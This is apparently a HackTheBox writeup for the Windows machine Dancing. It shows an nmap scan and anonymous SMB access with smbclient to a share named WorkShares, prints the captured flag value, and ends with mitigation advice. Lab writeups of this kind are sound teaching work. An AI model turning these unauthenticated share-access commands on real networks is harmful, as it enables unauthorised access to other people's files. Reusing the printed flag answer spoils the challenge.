# Dancing - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Windows
**IP Address:** 10.129.1.12
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Dancing**. 

*   **Initial Access:** Unauthenticated SMB share access (Port 445).
*   **Privilege Escalation:** Not required for this Tier 0 machine.
*   **Key Learning Points:** 
    * Enumerating SMB shares using `smbclient`.
    * Identifying and accessing sensitive information on misconfigured network shares.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 135/tcp | msrpc | - | Microsoft RPC service. |
| 139/tcp | netbios-ssn | - | NetBIOS Session Service. |
| 445/tcp | microsoft-ds | - | SMB service, potential for anonymous access. |

**Nmap Command:**
```bash
nmap -p- --min-rate=5000 10.129.1.12 -oN nmap/Dancing-allports
```

## 2.2. Web Enumeration
**Strategy:** No web services were found on the target machine.

---

# 3. Initial Access (Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Unauthenticated/Anonymous SMB share access.
*   **Vector:** SMB service on port 445.

## 3.2. Exploitation Path
The reconnaissance phase identified an active SMB service on port 445. Using `smbclient`, the available shares were enumerated without providing a password. A share named `WorkShares` was identified as accessible. Upon connecting to this share, several user directories were found. The flag was located within the `James.P` directory.

**Payload/Tool:**
```bash
# List shares
smbclient -L 10.129.1.12 -N

# Connect to WorkShares
smbclient //10.129.1.12/WorkShares -N

# Navigate and download flag
smb: \> cd James.P
smb: \James.P\> get flag.txt
```

**Flag:**
```bash
cat flag.txt
# 5f61c10dffbc77a704d76016a22f1664
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Not applicable for this target.

---

# 5. Credentials & Loot

| Sharename | Access | Comment |
| :--- | :--- | :--- |
| WorkShares | Anonymous | Accessible without credentials, contains user files. |

---

# 6. Recommendations & Mitigation
1. **Disable Guest/Anonymous Access:** Restrict SMB share access to authenticated users only by disabling anonymous/guest logins.
2. **Implement Least Privilege:** Ensure that users only have access to the specific shares and folders required for their roles.
3. **Audit Share Permissions:** Regularly review and audit share and NTFS permissions to prevent unauthorized access to sensitive data.
